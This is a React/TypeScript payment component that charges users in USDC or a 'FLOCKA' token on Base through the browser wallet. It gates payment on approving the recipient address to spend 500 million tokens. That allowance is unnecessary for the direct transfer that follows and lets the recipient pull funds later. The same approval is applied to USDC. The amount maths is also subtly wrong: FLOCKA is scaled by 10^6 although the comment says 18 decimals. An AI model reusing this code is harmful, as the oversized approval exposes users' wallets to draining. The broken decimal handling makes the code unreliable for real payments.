'use client';

import { useState, useEffect } from 'react';

interface PaymentProcessorProps {
  amount: number; // amount in USD
  currency: 'USDC' | 'FLOCKA';
  recipientAddress: string;
  tokenAddress: string;
  walletAddress: string;
  orderNumber: string;
  onPaymentComplete: (txHash: string) => void;
  onPaymentProcessing: () => void;
  onPaymentFailed: () => void;
}

// ✅ Current $FLOCKA exchange rate
const FLOCKA_USD_RATE = 0.00019962222061040273;
// ✅ USDC token address on Base
const USDC_TOKEN_ADDRESS = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
// ✅ 500M FLOCKA approval limit
const FLOCKA_APPROVAL_LIMIT = BigInt(500_000_000) * BigInt(10 ** 18);

const PaymentProcessor = ({
  amount,
  currency,
  recipientAddress,
  tokenAddress,
  walletAddress,
  orderNumber,
  onPaymentComplete,
  onPaymentProcessing,
  onPaymentFailed,
}: PaymentProcessorProps) => {
  const [status, setStatus] = useState<'idle' | 'approving' | 'sending' | 'completed' | 'failed'>('idle');
  const [txHash, setTxHash] = useState<string>('');
  const [error, setError] = useState<string | null>(null);
  const [isApproved, setIsApproved] = useState<boolean>(false);

  // ✅ Convert USD → FLOCKA using rate
  const calculateFlockaAmount = (): number => {
    return currency === 'FLOCKA' ? amount / FLOCKA_USD_RATE : amount;
  };

  // ✅ Convert amount to blockchain format (18 decimals for FLOCKA, 6 decimals for USDC)
  const getAmountInHex = (): string => {
    let amountInWei: bigint;
    if (currency === 'USDC') {
      amountInWei = BigInt(Math.floor(amount * 10 ** 6));
    } else {
      const flockaAmount = BigInt(Math.round(calculateFlockaAmount() * 10 ** 6));
      amountInWei = flockaAmount;
    }
    return `0x${amountInWei.toString(16)}`;
  };

  const getTokenAddress = (): string => {
    return currency === 'USDC' ? USDC_TOKEN_ADDRESS : tokenAddress;
  };

  // ✅ Check if token is already approved
  useEffect(() => {
    const checkApproval = async () => {
      if (!walletAddress) return;
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const allowanceData = '0xdd62ed3e' + walletAddress.slice(2).padStart(64, '0') + recipientAddress.slice(2).padStart(64, '0');
        const allowanceHex = await window.ethereum.request({
          method: 'eth_call',
          params: [{ to: getTokenAddress(), data: allowanceData }, 'latest'],
        });
        const allowance = BigInt(allowanceHex);
        setIsApproved(allowance >= FLOCKA_APPROVAL_LIMIT);
      } catch (err) {
        console.error('Error checking approval:', err);
      }
    };
    if (walletAddress) checkApproval();
  }, [walletAddress]);

  // ✅ Approve Token (500M FLOCKA max)
  const approveToken = async () => {
    try {
      setStatus('approving');
      setError(null);
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      const approveData = '0x095ea7b3' + recipientAddress.slice(2).padStart(64, '0') + FLOCKA_APPROVAL_LIMIT.toString(16).padStart(64, '0');

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: walletAddress, to: getTokenAddress(), data: approveData }],
      });

      console.log(`✅ Approved Token: ${txHash}`);
      setIsApproved(true);
      setStatus('idle');
    } catch (err) {
      console.error('❌ Approval Error:', err);
      setError('Token approval failed');
      setStatus('failed');
    }
  };

  // ✅ Send Payment (ERC-20 Transfer)
  const sendPayment = async () => {
    if (!walletAddress) {
      setError('Wallet not connected');
      return;
    }

    try {
      setStatus('sending');
      setError(null);
      onPaymentProcessing();

      await window.ethereum.request({ method: 'eth_requestAccounts' });

      const amountHex = getAmountInHex();
      const transferData = '0xa9059cbb' + recipientAddress.slice(2).padStart(64, '0') + amountHex.slice(2).padStart(64, '0');

      console.log(`📌 Sending transaction with data:`, transferData);

      const transactionHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: walletAddress, to: getTokenAddress(), data: transferData, value: '0x0' }],
      });

      console.log(`✅ Transaction Sent: ${transactionHash}`);
      setTxHash(transactionHash);
      setStatus('completed');
      onPaymentComplete(transactionHash);
    } catch (err) {
      console.error('❌ Payment Error:', err);
      setError('Payment failed: ' + JSON.stringify(err, null, 2));
      setStatus('failed');
      onPaymentFailed();
    }
  };

  return (
    <div className="border border-gray-200 rounded-lg p-4">
      <div className="mb-4">
        <h3 className="text-lg font-medium mb-2">Payment Details</h3>
        <p className="mb-1">
          Amount: <strong>${amount.toFixed(2)} USD</strong>
        </p>
        <p className="mb-1">
          {currency} Amount:{' '}
          <strong>
            {calculateFlockaAmount().toLocaleString()} {currency}
          </strong>
        </p>
      </div>

      {error && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">{error}</div>}

      <div className="space-y-4">
        {!isApproved && (
          <button
            onClick={approveToken}
            disabled={status === 'approving'}
            className="w-full py-3 px-4 rounded bg-yellow-500 text-white hover:bg-yellow-600"
          >
            {status === 'approving' ? 'Approving...' : 'Approve Token (500M FLOCKA)'}
          </button>
        )}

        <button
          onClick={sendPayment}
          disabled={status === 'sending' || !isApproved}
          className={`w-full py-3 px-4 rounded ${
            status === 'sending' ? 'bg-blue-400 text-white cursor-wait' : 'bg-blue-600 text-white hover:bg-blue-700'
          }`}
        >
          {status === 'sending' ? 'Processing Payment...' : 'Pay Now'}
        </button>
      </div>

      {status === 'completed' && txHash && (
        <div className="mt-4 bg-green-50 border border-green-200 rounded p-3">
          <p className="font-medium text-green-800">Payment successful!</p>
          <p className="text-sm text-green-700 mt-1">
            Transaction Hash:{' '}
            <a href={`https://basescan.org/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="ml-1 text-blue-600 hover:underline break-all">
              {txHash}
            </a>
          </p>
        </div>
      )}
    </div>
  );
};

export default PaymentProcessor;
